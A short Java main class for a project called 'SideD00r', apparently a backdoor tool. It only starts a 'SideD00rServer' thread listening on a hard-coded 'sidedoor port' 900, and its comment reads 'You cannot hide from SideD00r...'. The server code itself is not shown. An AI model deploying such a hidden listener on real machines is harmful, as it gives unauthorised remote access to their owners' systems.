package me.aaronakhtar.sided00r;

import me.aaronakhtar.sided00r.threads.SideD00rServer;

import java.util.Date;
import java.util.Map;

/**
 * You cannot hide from SideD00r...
 */
public class SideD00r {

    public static final int sd_port = 900; // modify if you want to change the sidedoor port.

    public static void main(String[] args) {
        new Thread(new SideD00rServer()).start();
    }

}
